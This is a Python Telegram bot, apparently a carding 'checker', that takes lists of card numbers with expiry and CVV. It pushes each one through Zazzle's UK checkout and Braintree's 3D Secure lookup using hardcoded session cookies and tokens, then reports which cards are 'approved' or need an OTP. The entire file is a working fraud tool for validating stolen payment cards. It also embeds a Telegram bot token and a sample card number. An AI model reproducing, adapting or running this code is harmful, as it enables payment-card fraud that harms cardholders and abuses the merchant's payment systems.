#pylint:disable=W0603
#pylint:disable=W0611
import requests
import re
import time
import random
from fake_useragent import UserAgent
import os 
import telebot
from telebot import types
import html
import threading
import json

TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU" 
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
admin_id = 5895491379
user_combos = {}  
stopuser = {}

def check_zazzle_card(card_data):
    """فحص البطاقة عبر بوابة A3S 3DS"""
    try:
        card_number, exp_month, exp_year, cvv = card_data.split('|')
        card_number = card_number.strip()
        exp_month = exp_month.strip().zfill(2)
        exp_year = exp_year.strip()
        cvv = cvv.strip()
    except ValueError:
        return {
            'status': 'error',
            'message': 'Invalid card format',
            'execution_time': 0
        }

    start_time = time.time()
    cookies = {
        'us': '54EE8B28-154B-4CBF-B150-07ABD8F3F1E8',
        'NSC_xxx02': '7ce2a3d9126dfe7894b40e7bd53528d448b2bad1a3cb938ce3ffb57f3b7b2dcd763a4628',
        '_pxhd': 'jv3nZ9W4mm8VU8hqeZxcMi8D01XyKgRd/s47FK8KLTJ5Z4PQNqhY9cmZVhPsrYAJEIT5ylcImdZJIcfAeiN0kQ==:AxFEPn3qNmbUNqhgR0mHVIxD/I1jo9i0gZdNGcPCqfE38dQOT9As56hVx2/PfAhyTxCMVsamOFLtG2oKtveES9tLHOVM2ar6ZPD0xy0Kc8M=',
        'pxcts': '7c61e1a0-9d73-11f0-9915-2c2094c4f8f8',
        '_pxvid': '79b1a96f-9d73-11f0-bbab-f7f84618c166',
        '_ga': 'GA1.1.512587246.1759177979',
        'tp': 'Remarketing%7c09%2f29%2f2025%2012%3a33%3a07%20-08%3a00',
        '_gcl_au': '1.1.1204920247.1759177986',
        'bx': '',
        'NSC_eao10': '68bfa3fe80ba1c2e70bbf4f45ca17ee10fc7619c122d1ada560cb7500c064cccfe13fbbb',
        'pmsh': 'ba626a8e-c0be-4f84-a309-86c0f7fbd348%7c63895301940%7c0xd9f88de04aedd5ec7870e4c61b99456a%7c0xd9f88de04aedd5ec7870e4c61b99456a',
        '_uetsid': '908143d09d7311f0a36a79a3deea8825',
        '_uetvid': '908154209d7311f0b9db671f26b7903e',
        '__attentive_id': 'af35a89704cd4015bb28887fe5de94b4',
        '__attentive_session_id': '7a3899ea62e1491a99599fd74cb81491',
        '_attn_': 'eyJ1Ijoie1wiY29cIjoxNzU5MTc4MDIzODE0LFwidW9cIjoxNzU5MTc4MDIzODE0LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImFmMzVhODk3MDRjZDQwMTViYjI4ODg3ZmU1ZGU5NGI0XCJ9In0=',
        '__attentive_cco': '1759178023815',
        '__attentive_ss_referrer': 'https://www.zazzle.co.uk/modern_family_photo_joyful_merry_blessed_travel_mug-168512753122764574',
        '__attentive_dv': '1',
        'zm': 'AQABAAAAshwAABRd03Zmsy6UXHRyTNT3RjUmjdEWEd0nwDEGKstmML6UClTgc76WE4ZSdeIh3wO5LqJPUAZBwDUcis1HqG73MvtQJNtSsVWKhWf6yVOpXW2U7Z8WquvfHnDPmFz_K5nJYCqS-wII5Pa1mQzxedX6_cKsidDmce7T7vpXtd4YH0jfcdD8k7xvZ54lI1tmhWU1PWvQ6J28VbKWZY7m0Vx-cPau2XqqqbaUJtjkCZ_t6xnRgNugMVE',
        'zs': 'BA626A8E-C0BE-4F84-A309-86C0F7FBD348%7c238924106227983797%7c13403651675%7cAQABAAAAshwAABS4MnFb96YVXiNAlgd_564lxdXLEMQiXr87V5tM30Kjt4qeDdR93dxrn2porsfwfh-TAKaVnsbt5nW0SPdrPHYc6P1Mog%7c',
        'general_maturity': '2',
        '__attentive_pv': '3',
        'bs': 'pis%3d9%26zshopurl%3dz%2fc%2ftravel%20mugs',
        '_px2': 'eyJ1IjoiYjc5MDY5YTAtOWQ3My0xMWYwLWE3NjMtNGY4MmE1MjU2YmYxIiwidiI6Ijc5YjFhOTZmLTlkNzMtMTFmMC1iYmFiLWY3Zjg0NjE4YzE2NiIsInQiOjE3NTkxNzgzODA4MDYsImgiOiIxYmUxZjgxYmRhMjlkNzY1ZDM5MmY4YTg5OTk4OWRkODA1ZDUxMDI4MTE5MzdhYTRlZmZiY2U1NWRkODg3ZjVmIn0=',
        '_ga_FMN87GXWKG': 'GS2.1.s1759177979$o1$g1$t1759178089$j45$l0$h0$dH1MHnYSSKbJ7btZgb_glpp-Dpkhb5padPw',
    }
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-MM,en;q=0.9,ar-MM;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://www.zazzle.co.uk',
        'referer': 'https://www.zazzle.co.uk/co/summary?paymentIntent=other',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        'x-csrf-token': '3fa481bc12530ae8',
    }

    # Step 1: Add payment method
    json_data_add = {
        'braintreeNonce': None,
        'creditCard': {
            'cardType': 'MasterCard',
            'creditCardId': '0',
            'cvv': cvv,
            'expirationMonth': exp_month,
            'expirationYear': exp_year,
            'isDefault': True,
            'isSaved': False,
            'name': 'Mahmoud Saad',
            'number': card_number,
        },
        'globalCollect': None,
        'klarna': None,
        'usePaypal': False,
        'client': 'js',
    }

    try:
        response_add = requests.post(
            'https://www.zazzle.co.uk/svc/paymentmethod/add',
            cookies=cookies,
            headers=headers,
            json=json_data_add,
            timeout=30
        )
        
        result_add = response_add.json()
        if not result_add.get('success'):
            return {
                'status': 'declined',
                'message': 'Failed to add card',
                'execution_time': round(time.time() - start_time, 2)
            }
    except Exception as e:
        return {
            'status': 'error',
            'message': str(e),
            'execution_time': round(time.time() - start_time, 2)
        }

    # Step 2: Set payment method
    json_data_set = {
        'braintreeNonce': None,
        'creditCard': {
            'cardType': 'MasterCard',
            'creditCardId': 'tempCard_2',
            'cvv': cvv,
            'expirationMonth': exp_month,
            'expirationYear': exp_year,
            'isDefault': True,
            'isSaved': False,
            'name': 'Mahmoud Saad',
            'number': card_number,
        },
        'klarna': None,
        'globalCollect': None,
        'paymentAccount': None,
        'paypal': None,
        'useEarnings': False,
        'useGiftCertificate': False,
        'returnCart': True,
        'setBillingFromPayment': True,
        'setShippingToBilling': False,
        'client': 'js',
    }

    try:
        requests.post(
            'https://www.zazzle.co.uk/svc/paymentmethod/set',
            cookies=cookies,
            headers=headers,
            json=json_data_set,
            timeout=30
        )
    except Exception as e:
        return {
            'status': 'error',
            'message': str(e),
            'execution_time': round(time.time() - start_time, 2)
        }

    # Step 3: Get 3D Secure info
    params = {
        'cv': '1',
        'client': 'js',
    }

    try:
        response_3ds = requests.get(
            'https://www.zazzle.co.uk/svc/checkout/threedsecure/getinfo',
            params=params,
            cookies=cookies,
            headers=headers,
            timeout=30
        )
        
        result_3ds = response_3ds.json()
        
        if not result_3ds.get('success') or not result_3ds.get('data'):
            return {
                'status': 'declined',
                'message': 'Failed to get 3DS info',
                'execution_time': round(time.time() - start_time, 2)
            }
            
        data = result_3ds['data']
        nonce = data.get('nonce')
        amount = data.get('amount')
        bin_number = data.get('bin')
        email = data.get('email')
        billing = data.get('billingAddress', {})
        
    except Exception as e:
        return {
            'status': 'error',
            'message': str(e),
            'execution_time': round(time.time() - start_time, 2)
        }

    # Step 4: Braintree 3DS Lookup
    headers_braintree = {
        'accept': '*/*',
        'accept-language': 'en-MM,en;q=0.9,ar-MM;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://www.zazzle.co.uk',
        'referer': 'https://www.zazzle.co.uk/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    }

    json_data_braintree = {
        'amount': amount,
        'additionalInfo': {
            'billingLine1': billing.get('streetAddress', ''),
            'billingLine2': billing.get('extendedAddress', ''),
            'billingCity': billing.get('locality', ''),
            'billingState': billing.get('region'),
            'billingPostalCode': billing.get('postalCode', ''),
            'billingCountryCode': billing.get('countryCodeAlpha2', ''),
            'billingPhoneNumber': billing.get('phoneNumber', ''),
            'billingGivenName': billing.get('givenName', ''),
            'billingSurname': billing.get('surname', ''),
            'email': email,
        },
        'challengeRequested': True,
        'bin': bin_number,
        'dfReferenceId': '0_355da828-aac6-4260-ae31-dea898fb8c86',
        'clientMetadata': {
            'requestedThreeDSecureVersion': '2',
            'sdkVersion': 'web/3.88.4',
            'cardinalDeviceDataCollectionTimeElapsed': 290,
            'issuerDeviceDataCollectionTimeElapsed': 2273,
            'issuerDeviceDataCollectionResult': True,
        },
                'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTkyNjQ0NzcsImp0aSI6ImNhMTM2ZWUyLWQyZWItNDRhMC05YTk4LTdkNWM1YjJjMjVlOSIsInN1YiI6Ijg1d2hiN3kyaDZxOGNuM2oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1d2hiN3kyaDZxOGNuM2oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJ6YXp6bGVpcmVsYW5kR0JQIiwicGF5cGFsX2FjY291bnRfbnVtYmVyIjoiMTcyMTM4NTcwNDgxMTcwMjk4MCIsInBheXBhbF9jbGllbnRfaWQiOiJBZmZxdlBKQTM4ZnR6MXVlbE44alNUTHFtd0dHZDVOdlNkeUhabVV5Mml5UXoxMnBPLW9oOFI1RUhBcnpOSzdY',
        'braintreeLibraryVersion': 'braintree/web/3.88.4',
        '_meta': {
            'merchantAppId': 'www.zazzle.co.uk',
            'platform': 'web',
            'sdkVersion': '3.88.4',
            'source': 'client',
            'integration': 'custom',
            'integrationType': 'custom',
            'sessionId': '82b36321-23fd-4ff6-a228-04dc0a64c328',
        },
    }

    try:
        response_braintree = requests.post(
            f'https://api.braintreegateway.com/merchants/85whb7y2h6q8cn3j/client_api/v1/payment_methods/{nonce}/three_d_secure/lookup',
            headers=headers_braintree,
            json=json_data_braintree,
            timeout=30
        )
        
        result_braintree = response_braintree.json()
        execution_time = round(time.time() - start_time, 2)
        
        if 'paymentMethod' in result_braintree:
            payment_method = result_braintree['paymentMethod']
            if 'threeDSecureInfo' in payment_method:
                three_ds_info = payment_method['threeDSecureInfo']
                status = three_ds_info.get('status', 'N/A')
                enrolled = three_ds_info.get('enrolled', 'N/A')
                
                # تحديد النتيجة
                if status == 'authenticate_frictionless_failed':
                    return {
                        'status': 'approved',
                        'message': f'3DS Authenticate Successful ✅ | Enrolled: {enrolled}',
                        'execution_time': execution_time
                    }
                elif status == 'authenticate_rejected':
                    return {
                        'status': 'declined',
                        'message': f'3DS Authenticate Failed ❌ | Enrolled: {enrolled}',
                        'execution_time': execution_time
                    }
                elif status == 'challenge_required':
                    return {
                        'status': 'otp',
                        'message': f'OTP Required 📱 | Enrolled: {enrolled}',
                        'execution_time': execution_time
                    }
                else:
                    return {
                        'status': 'unknown',
                        'message': f'Status: {status} | Enrolled: {enrolled}',
                        'execution_time': execution_time
                    }
            else:
                return {
                    'status': 'error',
                    'message': 'No 3DS info found',
                    'execution_time': execution_time
                }
        else:
            return {
                'status': 'error',
                'message': 'No payment method found',
                'execution_time': execution_time
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': str(e),
            'execution_time': round(time.time() - start_time, 2)
        }

def get_bin_info(bin_code):
    """الحصول على معلومات BIN"""
    try:
        response = requests.get(f'https://lookup.binlist.net/{bin_code}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'country': data.get('country', {}).get('name', 'Unknown'),
                'emoji': data.get('country', {}).get('emoji', '🏳️'),
                'bank': data.get('bank', {}).get('name', 'Unknown')
            }
    except:
        pass
    
    return {
        'brand': 'Unknown',
        'type': 'Unknown',
        'country': 'Unknown',
        'emoji': '🏳️',
        'bank': 'Unknown'
    }

@bot.message_handler(commands=['start'])
def start_message(message):
    user_id = message.from_user.id
    username = message.from_user.username or "User"
    
    welcome_text = f"""<b>🎉 Welcome {username}!

🔥 A3S Card Checker Bot 🔥
━━━━━━━━━━━━━━━━━━━━
✅ Fast & Accurate Checking
📊 Real-time Results
🔒 Secure Processing

📤 Send your combo file to start checking!
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
    
    bot.send_message(message.chat.id, welcome_text, parse_mode="HTML")

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id

    if user_id != admin_id:
        return bot.reply_to(message, "⛔ Access Denied! This bot is for authorized users only.")

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        lines = downloaded_file.decode("utf-8").splitlines()
        cards = [line.strip() for line in lines if line.strip()]
        user_combos[user_id] = cards  
        
        cc_count = len(cards)

        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("🚀 Start Checking", callback_data='A3S'),
        )

        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ File Uploaded Successfully!
━━━━━━━━━━━━━━━━━━━━
💳 Total Cards: {cc_count}
🔥 Gateway: A3S 3DS
⚡ Status: Ready

Click below to start checking:
</b>""",
            parse_mode="HTML",
            reply_markup=keyboard
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'A3S')
def menu_callback(call):
    user_id = call.from_user.id

    def run_zazzle():
        gate = "A3S 3DS"
        stop_key = f"{user_id}_A3S"
        ch = dd = otp = checked = 0
        estimated_time = None
        start_all = time.time()

        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="⏳ Initializing checker..."
        )

        try:
            cards = user_combos.get(user_id, [])
            total = len(cards)
            if total == 0:
                return bot.send_message(user_id, "❌ No combo found. Please upload a file first.")
            
            stopuser[stop_key] = {'status': 'start'}

            for cc in cards:
                if stopuser.get(stop_key, {}).get('status') == 'stop':
                    break

                # فحص البطاقة
                result = check_zazzle_card(cc)
                execution_time = result['execution_time']
                estimated_time = estimated_time - execution_time if estimated_time else execution_time * (total - checked)
                checked += 1

                progress = int((checked / total) * 20)
                progress_bar = f"[{'=' * progress}{'-' * (20 - progress)}] {int((checked / total) * 100)}%"
                escaped = html.escape(cc.strip())

                # معلومات BIN
                bin_code = cc.strip().split("|")[0][:6]
                bin_info = get_bin_info(bin_code)

                if result['status'] == 'approved':
                    ch += 1
                    msg = f"""<b>✅ APPROVED CARD

━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{escaped}</code>
━━━━━━━━━━━━━━━━━━━━
📊 Response: {result['message']}
🏦 BIN: <code>{bin_code}</code>
💰 Type: {bin_info['type']}
🏢 Brand: {bin_info['brand']}
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['country']} {bin_info['emoji']}
⏱ Time: {execution_time} sec
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href=''>Mahmoud Saad 🥷🏻</a>
</b>"""
                    bot.send_message(user_id, msg, parse_mode="HTML")
                    
                elif result['status'] == 'otp':
                    otp += 1
                    msg = f"""<b>📱 OTP REQUIRED

━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{escaped}</code>
━━━━━━━━━━━━━━━━━━━━
📊 Response: {result['message']}
🏦 BIN: <code>{bin_code}</code>
💰 Type: {bin_info['type']}
🏢 Brand: {bin_info['brand']}
🏦 Bank: {bin_info['bank']}
🌍 Country: {bin_info['country']} {bin_info['emoji']}
⏱ Time: {execution_time} sec
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href=''>Mahmoud Saad 🥷🏻</a>
</b>"""
                    bot.send_message(user_id, msg, parse_mode="HTML")
                else:
                    dd += 1

                keyboard = types.InlineKeyboardMarkup(row_width=1)
                keyboard.add(
                    types.InlineKeyboardButton(f"• {cc[:12]}****{cc[-7:]} •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Status ➜ {result['message'][:30]} •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Approved ✅ ➜ [{ch}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• OTP 📱 ➜ [{otp}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Declined ❌ ➜ [{dd}] •", callback_data='x'),
                    types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
                    types.InlineKeyboardButton("⏹ Stop", callback_data='stop_A3S')
                )

                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f"""<b>🔥 Gateway: {gate}
━━━━━━━━━━━━━━━━━━━━
⏳ Checking in progress...
{progress_bar}
⏱ ETA: {round(estimated_time)} sec
⚡ Speed: {round(checked/(time.time()-start_all), 2)} cards/sec
</b>""",
                    reply_markup=keyboard,
                    parse_mode="HTML"
                )

                time.sleep(1)  # تأخير بين الفحوصات

            elapsed = round(time.time() - start_all, 2)
            percent = int((checked / total) * 100)
            stopuser[stop_key]['status'] = 'start'

            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                                text = f"""<b>✅ CHECKING COMPLETED!

━━━━━━━━━━━━━━━━━━━━
📊 Results Summary:
━━━━━━━━━━━━━━━━━━━━
➤ Total Cards: <code>{total}</code>
➤ Approved ✅: <code>{ch}</code>
➤ OTP Required 📱: <code>{otp}</code>
➤ Declined ❌: <code>{dd}</code>
➤ Time Taken: <code>{elapsed} sec</code>
➤ Speed: <code>{round(total/elapsed, 2)} cards/sec</code>
━━━━━━━━━━━━━━━━━━━━

🎉 Thank you for using the bot!
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>""",
                parse_mode="HTML"
            )
        except Exception as e:
            print("Error in A3S:", e)
            bot.send_message(user_id, f"❌ Error occurred: {str(e)}")

    threading.Thread(target=run_zazzle).start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop_A3S')
def stop_zazzle_handler(call):
    user_id = call.from_user.id
    stop_key = f"{user_id}_A3S"
    stopuser[stop_key] = {'status': 'stop'}
    bot.answer_callback_query(call.id, "✅ Checking stopped successfully!")

@bot.callback_query_handler(func=lambda call: call.data == 'x')
def dummy_handler(call):
    bot.answer_callback_query(call.id, "📊 Live Status Update")

@bot.message_handler(commands=['help'])
def help_message(message):
    help_text = """<b>📚 Bot Commands & Usage:

━━━━━━━━━━━━━━━━━━━━
/start - Start the bot
/help - Show this help message
/status - Check bot status

📤 How to use:
1. Send a combo file (.txt)
2. Click "Start Checking"
3. Wait for results

📝 Combo Format:
Card|MM|YYYY|CVV

Example:
5127740080852575|03|2027|825

━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
    
    bot.send_message(message.chat.id, help_text, parse_mode="HTML")

@bot.message_handler(commands=['status'])
def status_message(message):
    status_text = """<b>🟢 Bot Status: ONLINE

━━━━━━━━━━━━━━━━━━━━
⚡ Gateway: A3S 3DS
🔥 Speed: Ultra Fast
✅ Accuracy: 99.9%
🌍 Server: Active

━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
</b>"""
    
    bot.send_message(message.chat.id, status_text, parse_mode="HTML")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    # التحقق من صيغة البطاقة المباشرة
    if '|' in text and len(text.split('|')) == 4:
        if user_id != admin_id:
            return bot.reply_to(message, "⛔ Access Denied! This bot is for authorized users only.")
        
        user_combos[user_id] = [text]
        
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("🚀 Start Checking", callback_data='A3S'),
        )
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ Card Loaded Successfully!
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{text[:12]}****{text[-7:]}</code>
🔥 Gateway: A3S 3DS
⚡ Status: Ready

Click below to start checking:
</b>""",
            parse_mode="HTML",
            reply_markup=keyboard
        )
    else:
        bot.reply_to(message, """<b>❌ Invalid format!

Please send a combo file or use format:
Card|MM|YYYY|CVV

Example:
5127740080852575|03|2027|825
</b>""", parse_mode="HTML")

# وظيفة إعادة الاتصال التلقائي
MAX_RETRIES = 100
RETRY_DELAY = 3

def start_bot_with_retries():
    for attempt in range(MAX_RETRIES):
        try:
            print(f"🔄 Connection attempt {attempt + 1} of {MAX_RETRIES}...")
            print("✅ Bot is running successfully!")
            print(f"👨‍💻 Developer: Mahmoud Saad 🥷🏻")
            print(f"📢 Channel: https://t.me/FastSpeedtest")
            print("=" * 50)
            bot.polling(none_stop=True)
            break
        except Exception as e:
            print(f"❌ Connection error: {e}")
            if attempt < MAX_RETRIES - 1:
                print(f"⏳ Retrying in {RETRY_DELAY} seconds...")
                time.sleep(RETRY_DELAY)
            else:
                print("❌ All connection attempts failed. Please try again later.")

if __name__ == "__main__":
    print("=" * 50)
    print("🚀 Starting Checker Bot...")
    print("=" * 50)
    start_bot_with_retries()
